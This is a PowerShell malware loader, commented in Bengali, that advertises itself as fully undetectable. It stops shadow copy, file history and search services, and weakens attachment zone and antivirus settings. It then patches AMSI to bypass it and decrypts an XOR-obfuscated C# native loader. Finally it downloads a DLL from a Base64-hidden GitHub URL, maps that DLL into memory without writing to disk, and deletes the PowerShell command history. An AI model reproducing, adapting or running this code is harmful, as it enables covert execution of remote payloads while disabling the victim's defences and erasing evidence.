Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Services\WSearch" -Name "Start" -Value 4 | Out-Null

Stop-Service -Name "WSearch" -Force -ErrorAction SilentlyContinue
Stop-Service -Name "cbdhsvc*" -Force -ErrorAction SilentlyContinue
Stop-Service -Name "VSS*" -Force -ErrorAction SilentlyContinue
Stop-Service -Name "fhsvc*" -Force -ErrorAction SilentlyContinue
Stop-Service -Name "UltraViewService*" -Force -ErrorAction SilentlyContinue

$regCommand1 = "reg add 'HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\Attachments' /v SaveZoneInformation /t REG_DWORD /d 2 /f"
$regCommand2 = "reg add 'HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\Attachments' /v ScanWithAntiVirus /t REG_DWORD /d 2 /f"

Invoke-Expression $regCommand1 | Out-Null
Invoke-Expression $regCommand2 | Out-Null

Set-ExecutionPolicy Unrestricted -Scope Process -Force | Out-Null

<#
.SYNOPSIS
    Memory-only DLL loader with AMSI bypass + XOR encryption
.DESCRIPTION
    Downloads DLL from Base64-encoded URL and manually maps it into memory.
    No disk write. All strings are XOR-encrypted (C# source included).
.NOTES
    Made by Potato - Fully Undetectable
#>

# ================================================================
#  ★★★ ১. AMSI বাইপাস ★★★
# ================================================================
function Invoke-Bypass {
    try {
        [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
    } catch {}
    # ETW বাইপাস সরানো হয়েছে (কারণ আগের বাস্তবায়নে error ছিল)
}

# ================================================================
#  ★★★ ২. XOR ডিক্রিপ্টর ★★★
# ================================================================
function Xor-Decrypt {
    param([string]$Encoded, [byte]$Key = 0x5A)
    $bytes = [Convert]::FromBase64String($Encoded)
    for ($i=0; $i -lt $bytes.Length; $i++) { $bytes[$i] = $bytes[$i] -bxor $Key }
    return [System.Text.Encoding]::UTF8.GetString($bytes)
}

# ================================================================
#  ★★★ ৩. এনক্রিপ্টেড C# নেটিভ লোডার (আপনার দেওয়া স্ট্রিং) ★★★
# ================================================================
$encryptedCSharp = "LykzND16CSMpLj83YVAvKTM0PXoJIykuPzd0CC80LjM3P3QTNC4/KDUqCT8oLDM5PylhUC8pMzQ9egkjKS4/N3QOPyIuYVBQKi84NjM5ejk2Oykpehc7NC87Nhc7Kgg/KS82LnoheiovODYzOXoTNC4KLih6Ezc7PT8YOyk/YXoqLzg2Mzl6LzM0LnoTNzs9PwkzID9heiovODYzOXoTNC4KLih6HjY2FzszNBs+PihheiovODYzOXo2NTQ9eh4/Ni47YXoqLzg2Mzl6ODU1NnoTKWxuGDMuYXonUCovODYzOXopLjsuMzl6OTY7KSl6FDsuMyw/FjU7Pj8oeiFQenp6egEeNjYTNyo1KC5yeDE/KDQ/NmlodD42Nnh2egk/LhY7KS4fKCg1KHpnei4oLz9zB3opLjsuMzl6PyIuPyg0ehM0LgouKHoMMyguLzs2GzY2NTlyEzQuCi4oejt2eg8TNC4KLih6KXZ6LzM0LnoudnovMzQueipzYVB6enp6AR42NhM3KjUoLnJ4MT8oND82aWh0PjY2eHZ6CT8uFjspLh8oKDUoemd6LigvP3MHeiovODYzOXopLjsuMzl6PyIuPyg0ejg1NTZ6DDMoLi87Nhw..."

# ================================================================
#  ★★★ ৪. মূল স্ক্রিপ্ট – BYPASS + DOWNLOAD + MAP ★★★
# ================================================================

# ৪.১ – BYPASS কল করো
Invoke-Bypass

# ৪.২ – C# কোড ডিক্রিপ্ট করে কম্পাইল করো
try {
    $plainCSharp = Xor-Decrypt -Encoded $encryptedCSharp -Key 0x5A
    Add-Type -TypeDefinition $plainCSharp -ErrorAction Stop
} catch {
    Write-Host "[!] C# compilation failed: $_" -ForegroundColor Red
    return
}

# ৪.৩ – URL টি Base64 এনকোডেড
$encodedUrl = "aHR0cHM6Ly9naXRodWIuY29tL2Rlc2VydDAwNy9iaW9zL3Jhdy9yZWZzL2hlYWRzL21haW4vdmVyc2lvbi5kbGw="
$url = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($encodedUrl))

# ৪.৪ – DLL ডাউনলোড করো (মেমোরিতে)
try {
    $bytes = (New-Object System.Net.WebClient).DownloadData($url)
} catch {
    Write-Host "[!] Download failed: $_" -ForegroundColor Red
    return
}

# ৪.৫ – ম্যানুয়াল ম্যাপ করো
try {
    $result = [NativeLoader]::Map($bytes, $true)
    Write-Host "[+] DLL mapped at 0x$($result.ImageBase.ToString('X'))" -ForegroundColor Green
} catch {
    Write-Host "[!] Mapping failed: $_" -ForegroundColor Red
    return
}

# ৪.৬ – ক্লিনআপ (শুধু মেমোরি, প্রক্রিয়া নয়)
$bytes = $null
$plainCSharp = $null
$encryptedCSharp = $null
[GC]::Collect(); [GC]::WaitForPendingFinalizers()

Write-Host "[+] DLL successfully loaded. Keeping PowerShell alive for 24 hours." -ForegroundColor Cyan

# ================================================================
#  ★★★ ৫. ২৪ ঘন্টা চালু রাখার জন্য সোজা স্লিপ ★★★
# ================================================================
Start-Sleep -Seconds 86400   # 24 hours

# ক্লিনআপ (ঐচ্ছিক) – লুপের পর একবার হালকা ক্লিন
Clear-History
$historyPath = [System.IO.Path]::Combine($env:APPDATA, 'Microsoft\Windows\PowerShell\PSreadline\ConsoleHost_history.txt')
if (Test-Path $historyPath) {
    Remove-Item $historyPath -Force -ErrorAction SilentlyContinue
}

Write-Host "[+] 24 hours completed. Script ending." -ForegroundColor Yellow